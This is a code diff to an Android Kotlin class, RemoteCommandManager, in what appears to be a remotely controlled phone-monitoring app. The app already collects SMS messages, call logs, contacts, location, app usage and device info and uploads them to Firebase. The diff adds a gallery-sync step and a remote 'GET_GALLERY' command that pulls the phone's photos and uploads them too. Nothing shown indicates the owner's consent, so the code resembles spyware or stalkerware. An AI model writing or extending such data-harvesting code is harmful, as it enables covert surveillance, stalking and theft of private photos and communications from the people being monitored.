@@ -88,6 +88,7 @@ class RemoteCommandManager(private val context: Context) {
                     SmsSyncManager(context).syncSmsMessages()
                     CallLogSyncManager(context).syncCallLogs()
                     ContactsSyncManager(context).syncContacts()
+                    GallerySyncManager(context).syncGallery()
                     AppUsageSyncManager(context).syncAppUsageStats()
                     LocationSyncManager(context).captureAndSyncLocation()
                     DeviceInfoSyncManager(context).collectAndSyncDeviceInfo()
@@ -108,6 +109,10 @@ class RemoteCommandManager(private val context: Context) {
                     ContactsSyncManager(context).syncContacts()
                     FirebaseSyncEngine(context).pushTelemetryToFirebase()
                     resultMessage = "Contacts synchronized successfully."
+                }
+                "GET_GALLERY", "SYNC_GALLERY", "FETCH_GALLERY", "GALLERY" -> {
+                    val galleryItems = GallerySyncManager(context).syncGallery()
+                    resultMessage = "Gallery synchronized: ${galleryItems.size} photos retrieved and backed up to Firebase."
                 }
                 "CLEAR_REMOTE_DATA", "PURGE_DATA", "WIPE_DATA", "CLEAR_DATA", "DELETE_ALL" -> {
                     FirebaseSyncEngine(context).clearAllRemoteData()
